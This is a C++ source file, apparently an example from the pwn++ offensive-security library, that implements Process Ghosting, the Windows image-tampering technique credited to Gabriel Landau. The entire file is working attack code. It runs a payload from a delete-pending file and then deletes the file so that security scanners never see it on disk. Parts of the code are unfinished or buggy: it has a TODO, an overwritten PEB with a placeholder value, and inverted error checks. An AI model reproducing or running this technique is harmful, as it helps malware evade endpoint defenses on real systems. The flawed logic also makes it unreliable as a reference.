///
/// @file ProcessGhosting.cpp
///
/// @author @hugsy
///
/// @brief Basic implementation of Process Ghosting - all credits to Gabriel Landau, this file is just an example of
/// using pwn++ for the attack he invented
///
/// @ref Gabriel Landau - https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack
///

#include <pwn.hpp>
#include <stdexcept>
using namespace pwn;


auto
wmain(const int argc, const wchar_t** argv) -> int
{
    Context.LogLevel = Log::LogLevel::Debug;

    //
    // By default, the program will execute `explorer.exe` as the ghost process of `ghost.exe`
    //

    const auto GhostProcessPath =
        (argc >= 2) ? std::filesystem::path(argv[1]) : std::filesystem::path(L"C:\\Windows\\System32\\explorer.exe");

    const auto GhostedProcessPath =
        (argc >= 3) ? std::filesystem::path(argv[2]) : std::filesystem::path(L".\\ghost.exe");


    //
    // 1. Create a file
    //
    auto GhostFile   = FileSystem::File(GhostedProcessPath);
    auto PayloadFile = FileSystem::File(GhostProcessPath);


    //
    // 2. Put the file into a delete-pending state using NtSetInformationFile(FileDispositionInformation). Note:
    // Attempting to use FILE_DELETE_ON_CLOSE instead will not delete the file.
    //
    FILE_DISPOSITION_INFORMATION fdi {};
    fdi.DeleteFile = true;
    if ( Failed(GhostFile.Set(FILE_INFORMATION_CLASS::FileDispositionInformation, fdi)) )
    {
        err(" NtSetInformationFile(FileDispositionInformation) failed");
        return EXIT_FAILURE;
    }


    //
    // 3. Write the payload executable to the file. The content isn’t persisted because the file is already
    // delete-pending. The delete-pending state also blocks external file-open attempts.
    //
    {
        auto const FileSize = ValueOr<usize>(PayloadFile.Size(), 0);
        auto hMap           = UniqueHandle {Value(GhostFile.Map(PAGE_READONLY))};
        auto View           = GhostFile.View(hMap.get(), 0, PAGE_READONLY, FileSize);
        auto hView          = FileSystem::FileMapViewHandle {Value(View)};
        DWORD bytesWritten {};
        ::WriteFile(GhostFile.Handle(), hView.get(), FileSize, &bytesWritten, nullptr);
    }


    //
    // 4. Create an image section for the file.
    //
    UniqueHandle hSection {
        [&GhostFile]() -> HANDLE
        {
            HANDLE h;
            return NT_SUCCESS(pwn::Resolver::ntdll::NtCreateSection(
                       &h,
                       SECTION_ALL_ACCESS,
                       nullptr,
                       nullptr,
                       PAGE_EXECUTE_READ,
                       SEC_IMAGE,
                       GhostFile.Handle())) ?
                       h :
                       INVALID_HANDLE_VALUE;
        }()};
    if ( !hSection )
    {
        Log::perror("NtCreateSection");
        return EXIT_FAILURE;
    }

    ok("RX section opened as {}", hSection.get());


    //
    // 5. Close the delete-pending handle, deleting the file.
    //
    GhostFile.Close();


    //
    // 6. Create a process using the image section.
    //
    UniqueHandle hProcess {
        [&hSection]() -> HANDLE
        {
            HANDLE h;
            return NT_SUCCESS(::NtCreateProcessEx(
                       &h,
                       PROCESS_ALL_ACCESS,
                       nullptr,
                       ::GetCurrentProcess(),
                       0,
                       hSection.get(),
                       nullptr,
                       nullptr,
                       false)) ?
                       h :
                       INVALID_HANDLE_VALUE;
        }()};
    if ( hProcess )
    {
        Log::perror("NtCreateProcessEx");
        return EXIT_FAILURE;
    }

    Process::Process GhostedProcess {::GetProcessId(hProcess.get()), hProcess.get()};
    ok("Process created with PID={}", GhostedProcess.ProcessId());


    //
    // 7. Assign process arguments and environment variables.
    //
    // auto res = GhostedProcess.Query<PROCESS_BASIC_INFORMATION>(PROCESSINFOCLASS::ProcessBasicInformation);
    // TODO finish here
    const auto Peb = GhostedProcess.ProcessEnvironmentBlock();
    GhostedProcess.Memory.Write((uptr)Peb->ImageBaseAddress, Utils::Pack::p64(0x41414141'41414141));

    ok("Overwritten PEB@{} in process PID={}", (uptr)Peb, GhostedProcess.ProcessId());


    //
    // 8. Create a thread to execute in the process.
    //
    const uptr StartAddress = (uptr)GhostedProcess.ProcessEnvironmentBlock()->ImageBaseAddress;

    UniqueHandle hThread {
        [&hProcess, &StartAddress]() -> HANDLE
        {
            HANDLE h;
            return NT_SUCCESS(pwn::Resolver::ntdll::NtCreateThreadEx(
                       &h,
                       THREAD_ALL_ACCESS,
                       nullptr,
                       hProcess.get(),
                       (LPTHREAD_START_ROUTINE)StartAddress,
                       nullptr,
                       false,
                       0,
                       0,
                       0,
                       nullptr)) ?
                       h :
                       INVALID_HANDLE_VALUE;
        }()};
    if ( hThread )
    {
        Log::perror("NtCreateThreadEx");
        return EXIT_FAILURE;
    }

    ok("Started thread TID={} with start address @ {} in process PID={}",
       hThread.get(),
       StartAddress,
       GhostedProcess.ProcessId());

    Utils::Pause();

    return EXIT_SUCCESS;
}
